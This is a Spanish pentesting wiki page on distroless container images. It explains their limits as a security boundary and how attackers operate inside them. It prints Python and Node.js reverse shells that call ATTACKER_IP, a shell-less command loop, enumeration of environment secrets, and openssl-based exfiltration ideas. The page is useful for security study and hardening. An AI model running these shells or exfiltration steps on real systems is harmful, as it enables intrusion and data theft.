# Contenedores Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Una imagen de contenedor **distroless** es una imagen que incluye los **componentes mínimos de runtime requeridos para ejecutar una aplicación específica**, mientras elimina intencionadamente las herramientas habituales de la distribución como gestores de paquetes, shells y grandes conjuntos de utilidades genéricas del userland. En la práctica, las imágenes distroless suelen contener solo el binario o runtime de la aplicación, sus librerías compartidas, bundles de certificados y una disposición de sistema de ficheros muy pequeña.

La idea no es que distroless sea una nueva primitiva de aislamiento del kernel. Distroless es una **estrategia de diseño de imagen**. Cambia lo que está disponible **dentro** del sistema de ficheros del contenedor, no cómo el kernel aísla el contenedor. Esa distinción importa, porque distroless endurece el entorno principalmente reduciendo lo que un atacante puede usar después de conseguir ejecución de código. No sustituye namespaces, seccomp, capabilities, AppArmor, SELinux ni ningún otro mecanismo de aislamiento en tiempo de ejecución.

## Por qué existen las imágenes Distroless

Las imágenes distroless se usan principalmente para reducir:

- el tamaño de la imagen
- la complejidad operativa de la imagen
- el número de paquetes y binarios que podrían contener vulnerabilidades
- el número de herramientas de post-explotación disponibles para un atacante por defecto

Por eso las imágenes distroless son populares en despliegues de aplicaciones en producción. Un contenedor que no contiene shell, ni gestor de paquetes, y casi ninguna herramienta genérica suele ser más fácil de razonar operativamente y más difícil de abusar de forma interactiva tras una compromisión.

Ejemplos de familias de imágenes estilo distroless conocidas incluyen:

- Google's distroless images
- Chainguard hardened/minimal images

## Qué no significa Distroless

Una imagen distroless **no** es:

- automáticamente rootless
- automáticamente non-privileged
- automáticamente read-only
- automáticamente protegida por seccomp, AppArmor, o SELinux
- automáticamente segura frente a container escape

Sigue siendo posible ejecutar una imagen distroless con `--privileged`, compartiendo namespaces del host, con bind mounts peligrosos o con el socket del runtime montado. En ese escenario la imagen puede ser mínima, pero el contenedor puede seguir siendo catastróficamente inseguro. Distroless cambia la superficie de ataque del **userland**, no el **límite de confianza del kernel**.

## Características operativas típicas

Cuando comprometes un contenedor distroless, lo primero que sueles notar es que las suposiciones comunes dejan de ser ciertas. Puede no haber `sh`, no haber `bash`, no haber `ls`, no haber `id`, no haber `cat`, y a veces ni siquiera un entorno basado en libc que se comporte como espera tu tradecraft habitual. Esto afecta tanto a ofensiva como a defensa, porque la falta de herramientas hace que el debugging, la respuesta a incidentes y la post-explotación sean diferentes.

Los patrones más comunes son:

- el runtime de la aplicación existe, pero poco más
- los payloads basados en shell fallan porque no hay shell
- los one-liners de enumeración comunes fallan porque faltan los binarios auxiliares
- las protecciones del sistema de ficheros como rootfs en modo read-only o `noexec` en ubicaciones tmpfs grabables suelen estar presentes también

Esa combinación es lo que suele llevar a la gente a hablar de "weaponizing distroless".

## Distroless y Post-Exploitation

El principal reto ofensivo en un entorno distroless no siempre es la RCE inicial. A menudo es lo que viene después. Si la carga explotada da ejecución de código en un language runtime como Python, Node.js, Java o Go, es posible ejecutar lógica arbitraria, pero no a través de los flujos de trabajo centrados en shell que son comunes en otros objetivos Linux.

Eso significa que la post-explotación a menudo se desplaza hacia una de tres direcciones:

1. **Use the existing language runtime directly** para enumerar el entorno, abrir sockets, leer ficheros o stagear payloads adicionales.
2. **Bring your own tooling into memory** si el filesystem es read-only o las ubicaciones escribibles están montadas `noexec`.
3. **Abuse existing binaries already present in the image** si la aplicación o sus dependencias incluyen algo inesperadamente útil.

## Abuso

### Enumerate The Runtime You Already Have

En muchos contenedores distroless no hay shell, pero todavía existe un runtime de la aplicación. Si el objetivo es un servicio Python, Python está presente. Si el objetivo es Node.js, Node está presente. Eso a menudo proporciona funcionalidad suficiente para enumerar ficheros, leer variables de entorno, abrir reverse shells y stagear ejecución en memoria sin invocar jamás `/bin/sh`.

Un ejemplo sencillo con Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un ejemplo sencillo con Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperación de variables de entorno, a menudo incluyendo credenciales o endpoints de servicio
- enumeración del sistema de archivos sin `/bin/ls`
- identificación de rutas con permisos de escritura y secretos montados

### Reverse Shell sin `/bin/sh`

Si la imagen no contiene `sh` o `bash`, un reverse shell clásico basado en shell puede fallar inmediatamente. En ese caso, usa el runtime del lenguaje instalado en su lugar.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` no existe, reemplaza la línea final por la ejecución directa de comandos impulsada por Python o por un bucle REPL de Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
De nuevo, si `/bin/sh` está ausente, usa directamente las APIs de filesystem, process y networking de Node en lugar de invocar un shell.

### Ejemplo completo: bucle de comandos Python sin shell

Si la imagen tiene Python pero no tiene ningún shell, un simple bucle interactivo suele ser suficiente para mantener la post-exploitation capability:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Esto no requiere un interactive shell binary. El impacto es, desde la perspectiva del atacante, efectivamente el mismo que una shell básica: command execution, enumeration, and staging of further payloads through the existing runtime.

### Ejecución de herramientas en memoria

Las imágenes distroless a menudo se combinan con:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Esa combinación hace que los flujos de trabajo clásicos de "download binary to disk and run it" sean poco fiables. En esos casos, las técnicas de ejecución en memoria se convierten en la principal respuesta.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Algunas imágenes distroless todavía contienen binarios necesarios para la operación que resultan útiles tras una compromisión. Un ejemplo repetidamente observado es `openssl`, porque las aplicaciones a veces lo necesitan para tareas relacionadas con crypto o TLS.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` está presente, puede usarse para:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

El abuso exacto depende de lo que esté realmente instalado, pero la idea general es que distroless no significa "sin herramientas en absoluto"; significa "muchas menos herramientas que una imagen de distribución normal".

## Checks

El objetivo de estas comprobaciones es determinar si la imagen es realmente distroless en la práctica y qué runtime o binarios auxiliares siguen estando disponibles para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Lo interesante aquí:

- Si no existe shell pero hay un runtime como Python o Node, la post-exploitation debería pivotar hacia la ejecución dirigida por el runtime.
- Si el root filesystem es de solo lectura y `/dev/shm` es escribible pero `noexec`, las técnicas de ejecución en memoria se vuelven mucho más relevantes.
- Si binarios auxiliares como `openssl`, `busybox` o `java` existen, pueden ofrecer suficiente funcionalidad para facilitar un acceso adicional.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Userland mínimo por diseño | Sin shell, sin package manager, solo dependencias de aplicación/runtime | añadir capas de debugging, sidecar shells, copiar busybox o herramientas |
| Chainguard minimal images | Userland mínimo por diseño | Superficie de paquetes reducida, a menudo centrada en un runtime o servicio | usar `:latest-dev` o variantes de debug, copiar herramientas durante el build |
| Kubernetes workloads using distroless images | Depende de la configuración del Pod | Distroless afecta solo al userland; la postura de seguridad del Pod sigue dependiendo del spec del Pod y los valores por defecto del runtime | añadir contenedores de debug efímeros, montajes de host, configuraciones de Pod privilegiado |
| Docker / Podman running distroless images | Depende de las flags de ejecución | Sistema de archivos mínimo, pero la seguridad en tiempo de ejecución aún depende de flags y de la configuración del daemon | `--privileged`, compartir host namespaces, montar sockets del runtime, binds de host escribibles |

El punto clave es que distroless es una **propiedad de la imagen**, no una protección del runtime. Su valor viene de reducir lo que está disponible dentro del filesystem tras un compromiso.

## Related Pages

For filesystem and memory-execution bypasses commonly needed in distroless environments:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

For container runtime, socket, and mount abuse that still applies to distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
